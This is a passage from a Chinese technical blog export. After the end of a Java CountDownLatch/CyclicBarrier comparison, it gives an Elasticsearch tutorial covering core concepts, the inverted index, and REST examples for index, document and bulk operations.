class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">CyclicBarrierTest2</span> <span class="variable">cyclicBarrierTest2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrierTest2</span>();</span><br><span class="line">        cyclicBarrierTest2.analyse();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们将<code>CyclicBarrier</code>的初值设为3，需要等待3块数据全部处理完毕后，这三个线程才能同时通过<code>await()</code>，通过后会优先执行<code>this</code>的<code>run</code>方法，也就是CyclicBarrierTest2的<code>run</code>方法，在这里面我们执行数据总体分析的流程。</p>
<h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>CountDownLatch和CyclicBarrier的区别如下：</p>
<table>
<thead>
<tr>
<th>CountDownLatch</th>
<th>CyclicBarrier</th>
</tr>
</thead>
<tbody><tr>
<td>减计数方式</td>
<td>加计数方式</td>
</tr>
<tr>
<td>计算为0时释放所有等待的线程</td>
<td>计数达到指定值时释放所有等待线程</td>
</tr>
<tr>
<td>计数为0时，无法重置</td>
<td>计数达到指定值时，计数置为0重新开始</td>
</tr>
<tr>
<td>调用countDown()方法计数减一，调用await()方法只进行阻塞，对计数没任何影响</td>
<td>调用await()方法计数加1，若加1后的值不等于构造方法的值，则线程阻塞</td>
</tr>
<tr>
<td>不可重复利用</td>
<td>可重复利用</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>ELK</title>
    <url>/2021/07/25/2021/ELK/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="ElasticSearch简介"><a href="#ElasticSearch简介" class="headerlink" title="ElasticSearch简介"></a>ElasticSearch简介</h1><p>Elasticsearch是用Java开发并且是当前最流行的开源的企业级搜索引擎。能够达到实时搜索，稳定，可靠，快速，安装使用方便。客户端支持Java、.NET（C#）、PHP、Python、Ruby等多种语言。</p>
<h2 id="ES与Lucene的关系"><a href="#ES与Lucene的关系" class="headerlink" title="ES与Lucene的关系"></a>ES与Lucene的关系</h2><p>Lucene可以被认为是迄今为止最先进、性能最好的、功能最全的搜索引擎库（框架）。但是想要使用Lucene，必须使用Java来作为开发语言并将其直接集成到你的应用中，并且Lucene的配置及使用非常复杂，你需要深入了解检索的相关知识来理解它是如何工作的。Lucene缺点：</p>
<ol>
<li>只能在Java项目中使用,并且要以jar包的方式直接集成项目中；</li>
<li>使用非常复杂，创建索引和搜索索引代码繁杂；</li>
<li>不支持集群环境-，索引数据不同步（不支持大型项目）；</li>
<li>索引数据如果太多就不行，索引库和应用所在同一个服务器，共同占用硬盘。</li>
</ol>
<p>上述Lucene框架中的缺点,ES全部都能解决。</p>
<h2 id="Es与Solr"><a href="#Es与Solr" class="headerlink" title="Es与Solr"></a>Es与Solr</h2><p>当单纯的对已有数据进行搜索时，Solr更快：</p>
<p><a href="https://i.loli.net/2021/03/18/ShtoJAxP9N34n1l.jpg"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/ShtoJAxP9N34n1l.jpg"
                      alt="es1.jpg"
                ></a></p>
<p>当实时建立索引时Solr会产生io阻塞（Solr需要从磁盘读数据），查询性能较差，Elasticsearch具有明显的优势：</p>
<p><a href="https://i.loli.net/2021/03/18/n7UQNHaXzYAviwF.jpg"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/n7UQNHaXzYAviwF.jpg"
                      alt="es2.jpg"
                ></a></p>
<p>大型互联网公司，实际生产环境测试，将搜索引擎从Solr转到 Elasticsearch以后的平均查询速度有了50倍的提升：</p>
<p><a href="https://i.loli.net/2021/03/18/7QukOowAjTdzERU.jpg"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/7QukOowAjTdzERU.jpg"
                      alt="es3.jpg"
                ></a></p>
<p>总结一下：</p>
<ol>
<li>Solr 利用 Zookeeper 进行分布式管理，而Elasticsearch 自身带有分布式协调管理功能。</li>
<li>Solr 支持更多格式的数据，比如JSON、XML、CSV，而 Elasticsearch 仅支持json文件格式。</li>
<li>Solr 在传统的搜索应用中表现好于 Elasticsearch，但在处理实时搜索应用时效率明显低于 Elasticsearch。</li>
<li>Solr 是传统搜索应用的有力解决方案，但 Elasticsearch更适用于新兴的实时搜索应用。</li>
</ol>
<h2 id="Es与关系型数据库"><a href="#Es与关系型数据库" class="headerlink" title="Es与关系型数据库"></a>Es与关系型数据库</h2><p><a href="https://i.loli.net/2021/03/18/ZlIFuVXAmGwOqQS.jpg"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/ZlIFuVXAmGwOqQS.jpg"
                      alt="es4.jpg"
                ></a></p>
<h2 id="全文检索"><a href="#全文检索" class="headerlink" title="全文检索"></a>全文检索</h2><p>全文检索是指：</p>
<p>对下图进行一个简要解释，说明全文检索的流程和理论：</p>
<p>首先我们对三个文本进行分词处理，得到对应的表，表中的<code>index</code>表示属于第几个文本【也就是文本的id</p>
<p>之后我们去重处理，通过图中可以发现，hello在第1、2个文本，elasticsearch在2、3文本。</p>
<p>之后我们对word进行排序处理，是字母序【个人认为这是为了检索的更快，二分速度结束。</p>
<p>现在当我们输入关键字的时候，我们在最后一张表中可以发现关键字存在的文本index是哪些，如此便可把对应文本输出出来。</p>
<p>搜索迅速的原因在于：单词是有限的，那么当我们每次进行词条添加时，对应的关键字可能都已经存在过了，仅仅需要在关键字的index中添加记录即可。</p>
<p><a href="https://i.loli.net/2021/03/18/2MYmjRiBLnG6dUx.jpg"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/2MYmjRiBLnG6dUx.jpg"
                      alt="es5.jpg"
                ></a></p>
<ul>
<li>通过一个程序扫描文本中的每一个单词，针对单词建立索引，并保存该单词在文本中的位置、以及出现的次数</li>
<li>用户查询时，通过之前建立好的索引来查询，将索引中单词对应的文本位置、出现的次数返回给用户，因为有了具体文本的位置，所以就可以将具体内容读取出来了</li>
</ul>
<p>索引就类似于目录，平时我们使用的都是索引，都是通过主键定位到某条数据。那么倒排索引刚好相反，数据对应到主键。</p>
<h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><ul>
<li><p><strong>索引index</strong></p>
<p>一个索引就是一个拥有几分相似特征的文档的集合。比如说，可以有一个客户数据的索引，另一个产品目录的索引，还有一个订单数据的索引。 一个索引由一个名字来标识（必须全部是小写字母的），并且当我们要对对应于这个索引中的文档进行索引、搜索、更新和删除的时候，都要使用到这个名字。</p>
</li>
<li><p><strong>映射mapping</strong></p>
<p>ElasticSearch中的映射（Mapping）用来定义一个文档。mapping是处理数据的方式和规则方面做一些限制，如某个字段的数据类型、默认值、分词器、是否被索引等等，这些都是映射里面可以设置的。</p>
</li>
<li><p><strong>字段field</strong></p>
</li>
</ul>
<p>相当于是数据表的字段|列。</p>
<ul>
<li><strong>字段类型type</strong></li>
</ul>
<p>每一个字段都应该有一个对应的类型，例如Text、Keyword、Byte等。</p>
<ul>
<li><strong>文档document</strong></li>
</ul>
<p>一个文档是一个可被索引的基础信息单元，类似一条记录。文档以JSON（Javascript Object Notation）格式来表示。</p>
<ul>
<li><strong>集群 cluster</strong></li>
</ul>
<p>一个集群就是由一个或多个节点组织在一起，它们共同持有整个的数据，并一起提供索引和搜索功能。</p>
<ul>
<li><strong>节点 node</strong></li>
</ul>
<p>一个节点是集群中的一个服务器，作为集群的一部分，它存储数据，参与集群的索引和搜索功能。 一个节点可以通过配置集群名称的方式来加入一个指定的集群。默认情况下，每个节点都会被安排加入到一个叫做<code>elasticsearch</code>的集群中。这意味着，如果在网络中启动了若干个节点，并假定它们能够相互发现彼此，它们将会自动地形成并加入到一个叫做<code>elasticsearch</code>的集群中。在一个集群里，可以拥有任意多个节点。而且，如果当前网络中没有运行任何Elasticsearch节点，这时启动一个节点，会默认创建并加入一个叫做<code>elasticsearch</code>的集群。</p>
<ul>
<li><strong>分片shards</strong></li>
</ul>
<p>一个索引可以存储超出单个结点硬件限制的大量数据。比如，一个具有10亿文档的索引占据1TB的磁盘空间，而任一节点都没有这样大的磁盘空间；或者单个节点处理搜索请求，响应太慢。</p>
<p>为了解决这个问题，Elasticsearch提供了将索引划分成多份的能力，这些份就叫做分片。当创建一个索引的时候，可以指定你想要的分片的数量。每个分片本身也是一个功能完善并且独立的索引，这个索引可以被放置到集群中的任何节点上。分片很重要，主要有两方面的原因：</p>
<ol>
<li>允许水平分割&#x2F;扩展你的内容容量。</li>
<li>允许在分片之上进行分布式的、并行的操作，进而提高性能&#x2F;吞吐量。</li>
</ol>
<p>至于一个分片怎样分布，它的文档怎样聚合回搜索请求，是完全由Elasticsearch管理的，对于作为用户来说这些都是透明的。</p>
<ul>
<li><strong>副本replicas</strong></li>
</ul>
<p>在一个网络&#x2F;云的环境里，失败随时都可能发生，在某个分片&#x2F;节点不知怎么的就处于离线状态，或者由于任何原因消失了，这种情况下，有一个故障转移机制是非常有用并且是强烈推荐的。为此目的，Elasticsearch允许你创建分片的一份或多份拷贝，这些拷贝叫做副本分片，或者直接叫副本。副本之所以重要，有两个主要原因：</p>
<ol>
<li>在分片&#x2F;节点失败的情况下，提供了高可用性。注意到复制分片不要与原&#x2F;主要（original&#x2F;primary）分片置于同一节点上是非常重要的。</li>
<li>扩展搜索量&#x2F;吞吐量，因为搜索可以在所有的副本上并行运行。</li>
</ol>
<p>每个索引可以被分成多个分片，一个索引有0个或者多个副本。一旦设置了副本，每个索引就有了主分片和副本分片，分片和副本的数量可以在索引创建的时候指定。在索引创建之后，可以在任何时候动态地改变副本的数量，但是不能改变分片的数量。</p>
<h1 id="ES数据基本操作"><a href="#ES数据基本操作" class="headerlink" title="ES数据基本操作"></a>ES数据基本操作</h1><p>ES是面向文档（document oriented）的，这意味着它可以存储整个对象或文档（document）</p>
<p>。然而它不仅仅是存储，还会索引（index）每个文档的内容使之可以被搜索。在ES中，你可以对文档（而非成行成列的数据）进行索引、搜索、排序、过滤。ES使用JSON作为文档序列化格式，JSON现在已经被大多语言所支持，而且已经成为NoSQL领域的标准格式。</p>
<blockquote>
<p>ES使用Restful风格进行操作。Restful是一种面向资源的架构风格，可以简单理解为：使用URL定位资源，用HTTP动词（GET,POST,DELETE,PUT）描述操作。 基于Restful，ES和所有客户端的交互都是使用JSON格式的数据。<strong>使用Restful的好处：</strong>透明性，暴露资源存在。充分利用 HTTP 协议本身语义，不同请求方式进行不同的操作</p>
</blockquote>
<ul>
<li>操作索引</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 创建索引</span><br><span class="line">PUT /es_db</span><br><span class="line"></span><br><span class="line">// 查询索引</span><br><span class="line">GET /es_db</span><br><span class="line"></span><br><span class="line">// 删除索引</span><br><span class="line">DELETE /es_db</span><br></pre></td></tr></table></figure>

<ul>
<li>添加文档</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES7版本后淡化了类型的概念，所有的类型名称都是_doc</span></span><br><span class="line">PUT /es_db/_doc/<span class="number">1</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;张三&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">25</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;广州天河公园&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java developer&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">PUT /es_db/_doc/<span class="number">2</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;李四&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">28</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;广州荔湾大厦&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java assistant&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">PUT /es_db/_doc/<span class="number">3</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rod&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">26</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;广州白云山公园&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;php developer&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">PUT /es_db/_doc/<span class="number">4</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">22</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;长沙橘子洲头&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;python assistant&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">PUT /es_db/_doc/<span class="number">5</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;小明&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">19</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;长沙岳麓山&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java architect assistant&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<h3 id="从-ES-7-0-开始，Type-被废弃"><a href="#从-ES-7-0-开始，Type-被废弃" class="headerlink" title="从 ES 7.0 开始，Type 被废弃"></a>从 ES 7.0 开始，Type 被废弃</h3><p>在 7.0 以及之后的版本中 Type 被废弃了。一个 index 中只有一个默认的 type，即 <code>_doc</code>。</p>
<p>ES 的Type 被废弃后，库表合一，Index 既可以被认为对应 MySQL 的 Database，也可以认为对应 table。</p>
<p>也可以这样理解：</p>
<ul>
<li>ES 实例：对应 MySQL 实例中的一个 Database。</li>
<li>Index 对应 MySQL 中的 Table 。</li>
<li>Document 对应 MySQL 中表的记录。</li>
</ul>
</blockquote>
<ul>
<li>修改文档</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PUT /索引名称/类型/id</span></span><br><span class="line">PUT /es_db/_doc/<span class="number">1</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;小黑&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">25</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;张家界森林公园&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;php developer assistant&quot;</span>				</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>我们对返回值进行一个审查：</p>
<p>如果不添加id，那么ES会帮我们自动生成一个id。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;_index&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;es_demo&quot;</span><span class="punctuation">,</span>  <span class="comment">//位于那个索引---&gt;库</span></span><br><span class="line">  <span class="attr">&quot;_type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span>      <span class="comment">//何种类型 7以后统一为认为_doc </span></span><br><span class="line">  <span class="attr">&quot;_id&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;5&quot;</span><span class="punctuation">,</span>           <span class="comment">//唯一id</span></span><br><span class="line">  <span class="attr">&quot;_version&quot;</span> <span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span>        <span class="comment">//数据可能会被更新，故而有版本号</span></span><br><span class="line">  <span class="attr">&quot;result&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;updated&quot;</span><span class="punctuation">,</span>  <span class="comment">//当前操作是属于更新操作</span></span><br><span class="line">  <span class="attr">&quot;_shards&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span>          </span><br><span class="line">    <span class="attr">&quot;total&quot;</span> <span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;successful&quot;</span> <span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;failed&quot;</span> <span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;_seq_no&quot;</span> <span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;_primary_term&quot;</span> <span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>POST和PUT都能起到创建或更新的作用，它们的区别如下：</p>
<ol>
<li>PUT需要对一个具体的资源进行操作也就是要<strong>确定id</strong>才能进行更新&#x2F;创建，不加id会报异常；而POST是可以针对整个资源集合进行操作的，如果不写id就由ES生成一个唯一id进行创建新文档，如果填了id那就针对这个id的文档进行创建&#x2F;更新。</li>
<li>PUT只会将json数据都进行替换，POST只会更新相同字段的值。</li>
<li>PUT与DELETE都是幂等性操作，即不论操作多少次结果都一样。</li>
</ol>
</blockquote>
<ul>
<li>查询文档</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 查询指定id文档</span><br><span class="line">GET /索引名称/类型/id</span><br><span class="line"></span><br><span class="line">2. 查询所有文档</span><br><span class="line">GET /索引名称/类型/_search</span><br><span class="line"></span><br><span class="line">3. 等值、大于、小于查询，A字段的值为B</span><br><span class="line">GET /索引名称/类型/_search?q=A:B</span><br><span class="line">GET /索引名称/类型/_search?q=A:&lt;B</span><br><span class="line">GET /索引名称/类型/_search?q=A:&gt;B</span><br><span class="line"></span><br><span class="line">4. 范围查询，A字段的范围是m到n</span><br><span class="line">GET /索引名称/类型/_search?q=A[m TO n]</span><br><span class="line"></span><br><span class="line">5. 多id查询</span><br><span class="line">GET /索引名称/类型/_mget </span><br><span class="line">&#123;</span><br><span class="line"> &quot;ids&quot;:[&quot;1&quot;,&quot;2&quot;]  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">6. 分页查询</span><br><span class="line">GET /索引名称/类型/_search?from=0&amp;size=1</span><br><span class="line"></span><br><span class="line">7. 投影</span><br><span class="line">GET /索引名称/类型/_search?_source=字段1,字段2</span><br><span class="line"></span><br><span class="line">8. 排序（desc降序、asc升序）</span><br><span class="line">GET /索引名称/类型/_search?sort=字段:desc</span><br></pre></td></tr></table></figure>

<ul>
<li>删除文档</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE /索引名称/类型/id</span><br></pre></td></tr></table></figure>

<h2 id="批量操作"><a href="#批量操作" class="headerlink" title="批量操作"></a>批量操作</h2><ul>
<li>批量获取文档数据</li>
</ul>
<p>批量获取文档数据是通过<code>_mget</code>的API来实现的：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET _mget</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;docs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span> <span class="string">&quot;es_db&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span> <span class="string">&quot;es_db&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>也可以将索引、类型的信息写在url中：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /es_db/_doc/_mget</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;docs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>批量操作文档数据，批量对文档进行写操作是通过<code>_bulk</code>的API来实现的</p>
</li>
<li><p>请求方式：POST</p>
</li>
<li><p>请求地址：_bulk</p>
</li>
<li><p>请求参数：通过_bulk操作文档，一般至少有两行参数(或偶数行参数)</p>
</li>
<li><ul>
<li>第一行参数为指定操作的类型及操作的对象(index,type和id)</li>
<li>第二行参数才是操作的数据</li>
</ul>
</li>
</ul>
<p>参数类似于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;actionName&quot;:&#123;&quot;_index&quot;:&quot;indexName&quot;, &quot;_type&quot;:&quot;typeName&quot;,&quot;_id&quot;:&quot;id&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;field1&quot;:&quot;value1&quot;, &quot;field2&quot;:&quot;value2&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>批量创建文档create</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST _bulk</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;create&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;文章1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;内容1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;java&quot;</span><span class="punctuation">,</span> <span class="string">&quot;面向对象&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;create_time&quot;</span><span class="punctuation">:</span><span class="number">1554015482530</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;create&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;文章2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;内容2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;java&quot;</span><span class="punctuation">,</span> <span class="string">&quot;面向对象&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;create_time&quot;</span><span class="punctuation">:</span><span class="number">1554015482530</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>普通创建或全量替换index</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST _bulk</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;index&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;图灵徐庶老师(一)&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;图灵学院徐庶老师666&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;java&quot;</span><span class="punctuation">,</span> <span class="string">&quot;面向对象&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;create_time&quot;</span><span class="punctuation">:</span><span class="number">1554015482530</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;index&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;图灵诸葛老师(二)&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;图灵学院诸葛老师NB&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;java&quot;</span><span class="punctuation">,</span> <span 